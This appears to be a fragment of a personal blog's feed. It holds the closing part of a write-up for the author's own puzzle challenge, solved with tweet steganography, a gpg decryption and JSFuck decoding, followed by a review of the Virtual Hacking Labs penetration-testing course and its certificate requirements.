+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt; the password is in the conversation &lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So, it seems like we are in the right path. Let’s analyze what’s in the message.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/message.png&quot; alt=&quot;message&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since there is no possible password that can be guessed from the conversation, we can then try to visit the twitter &lt;a href=&quot;https://twitter.com/yunaranyancat/status/1103367092710064129&quot;&gt;link&lt;/a&gt; that is given,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/tweet.png&quot; alt=&quot;tweet&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we look closely, it seems like the tweet is using some kind of steganography. There is a github page which can hide secret messages in our tweet which is &lt;a href=&quot;https://github.com/holloway/steg-of-the-dump&quot;&gt;https://github.com/holloway/steg-of-the-dump&lt;/a&gt;. So, when we run the code,we need to paste the tweet in decode text field, then we can see that there is indeed a hidden message.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/holloway.png&quot; alt=&quot;holloway&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can unlock the encrypted file using the following command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gpg key.txt.gpg
+when prompted with password, insert &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;mi-0w&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;-get-the-right-secret-key-&quot;&gt;&lt;u&gt; get the right secret key &lt;/u&gt;&lt;/h3&gt;
+
+&lt;p&gt;Once we open the text file, it seems like we have managed to get the secret key, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;YunaSanLoveChikaSan&lt;/code&gt;. Well, it’s not. :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/blocked.png&quot; alt=&quot;blocked&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Actually, that is what blocking us from getting the real secret key. The symbols surrounding the fake keys are parts of an esoteric programming language which is called &lt;code class=&quot;highlighter-rouge&quot;&gt;JSFuck&lt;/code&gt; . We can then remove all of the secret keys, and paste the symbols in any decoder site for example, &lt;a href=&quot;http://codertab.com/JsUnFuck&quot;&gt;http://codertab.com/JsUnFuck&lt;/a&gt; to get the clear text message.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/chika01/jsunfuck.png&quot; alt=&quot;jsunfuck&quot; /&gt;
+and voila! We finally got the secret key which is &lt;code class=&quot;highlighter-rouge&quot;&gt;yato&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;thank-you&quot;&gt;Thank you&lt;/h2&gt;
+
+&lt;p&gt;I would like to thank all of you whom have tried my challenges and for those who are interested in reading this writeup. I also would like to congratulate &lt;code class=&quot;highlighter-rouge&quot;&gt;mucomplex&lt;/code&gt; for being the first person who managed to solve this mini challenge.&lt;/p&gt;
+
+&lt;p&gt;I’m thinking about making another challenge(s) in the future, so, for those who are interested, hit me up on &lt;a href=&quot;https://twitter.com/yunaranyancat&quot;&gt;Twitter&lt;/a&gt; so I can send a personal invitation to my next challenge(s), or if you have any idea or want to collaborate, my dm is always open.&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Hello guys,</summary></entry><entry><title type="html">Virtual Hacking Labs Review</title><link href="http://localhost:4000/musubi/others/vhlreview" rel="alternate" type="text/html" title="Virtual Hacking Labs Review" /><published>2019-03-04T00:00:00+08:00</published><updated>2019-03-04T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/VHL_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/vhlreview">&lt;p&gt;Heyy, today, I will be reviewing Virtual Hacking Labs, &lt;a href=&quot;https://www.virtualhackinglabs.com/&quot;&gt;VHL&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;This post is mainly about my journey from starting VHL until I have managed to compromise 20 machines in the labs which is one the requirements to be elligible to apply for the Certificate of Completion.&lt;/p&gt;
+
+&lt;h3 id=&quot;about-vhl&quot;&gt;About VHL&lt;/h3&gt;
+
+&lt;p&gt;Okay, first, I will explain briefly what is VHL. VHL or Virtual Hacking Labs is a penetration testing platform for cybersecurity enthusiasts, which works almost the same as &lt;strong&gt;HackTheBox&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;You will be given three options for the pricing. If you want to get VHL certified, you need to buy at least 31 days of the lab access, which costs around 93€, which what I bought.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/VHL/second-pricing.png&quot; alt=&quot;second&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It is a self-paced course so you can learn anytime when you are free. If you buy the &lt;strong&gt;31 days&lt;/strong&gt; or &lt;strong&gt;93 days&lt;/strong&gt; , you will also get a PDF version of the course so you can read it while offline.&lt;/p&gt;
+
+&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;/h3&gt;
+
+&lt;p&gt;You don’t need that much prior experiences in pentesting. But, having good knowledge in &lt;strong&gt;Linux&lt;/strong&gt; distros or &lt;strong&gt;Metasploit&lt;/strong&gt; framework can help you in progressing throughout the lab.&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h3&gt;
+
+&lt;p&gt;Once you bought the course, you will be presented with a student panel, which contains the course, lab dashboard and other related things.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/VHL/student_panel.png&quot; alt=&quot;panel&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;vulnerable-machines&quot;&gt;Vulnerable Machines&lt;/h3&gt;
+
+&lt;p&gt;There are three different difficulty levels.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Beginner&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;These boxes are aimed to those who just started or want to dive in the world of pentesting. You can follow what’s in the PDF/hints to get into user and get root. Some of the boxes might have direct root exploit, so that no privilege escalation is needed.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Advanced&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;These boxes have little hints and you might need to do a bit of research outside the labs to compromise the machines.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Advanced+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;These boxes are aimed to challenge students to think out of the box, and to not rely much at hints (these boxes have too little to zero hints) and train your &lt;strong&gt;Google-Fu&lt;/strong&gt; skills. And I think that’s great because you’ll know if you have reached your limit so you can improve where you’re weak at.&lt;/p&gt;
+
+&lt;p&gt;For starters, I would recommend doing the boxes based on the ascending order of the difficulty so you won’t get lost.&lt;/p&gt;
+
+&lt;h3 id=&quot;certificate-of-completion&quot;&gt;Certificate Of Completion&lt;/h3&gt;
+
+&lt;p&gt;One of the requirements for students to be elligible to apply for the &lt;strong&gt;Certificate of Completion&lt;/strong&gt; is to compromise at least 20 machines and to do a thorough documentation for every machine compromised.&lt;/p&gt;
+
+&lt;p&gt;There is a text file which contains a secret string in every machine, so it can be used as a proof that the machine has been compromised with &lt;strong&gt;root&lt;/strong&gt; or &lt;strong&gt;SYSTEM&lt;/strong&gt; privileges.&lt;/p&gt;
+
+&lt;p&gt;Make sure , your documentation has enough information , and the attacks can be replicated by following your narratives.&lt;/p&gt;
+
+&lt;p&gt;Once you submit the documentation, you’ll need to wait until it has been verified. Then , you will be sent a beautiful &lt;strong&gt;VHL Certification of Completion&lt;/strong&gt; like mine below. :P&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/musubi/assets/VHL/COC.jpg&quot; alt=&quot;certificate&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;additional-information&quot;&gt;Additional Information&lt;/h3&gt;
+
+&lt;p&gt;There is no forum yet on VHL, so you won’t be able to discuss anything related to labs, or pentesting in general. But, I considered it as a challenge given by VHL . It took me almost 7 days to compromise those 20 machines. I didn’t touch the &lt;code class=&quot;highlighter-rouge&quot;&gt;Advanced+&lt;/code&gt; machines yet, until now but I’ll try to find time to jump back into VHL.&lt;/p&gt;
+
+&lt;h3 id=&quot;oscp&quot;&gt;OSCP&lt;/h3&gt;
+
+&lt;p&gt;Based on the reviews I got from one of the OSCP communities , VHL is a good place to learn if your lab time has finished, or maybe you want to find a place to start preparing for OSCP.&lt;/p&gt;
+
+&lt;h3 id=&quot;bye-&quot;&gt;Bye !&lt;/h3&gt;
+&lt;p&gt;If you are still wondering whether you should take VHL course or not, check out the &lt;a href=&quot;https://www.virtualhackinglabs.com/reviews/&quot;&gt;reviews&lt;/a&gt; from the website itself, or you can use the one week pass to see whether you’ll like it or not.&lt;/p&gt;
+
+&lt;p&gt;That’s all for today. Thank you!&lt;/p&gt;</content><author><name>yunaranyancat</name></author><summary type="html">Heyy, today, I will be reviewing Virtual Hacking Labs, VHL.</summary></entry></feed>
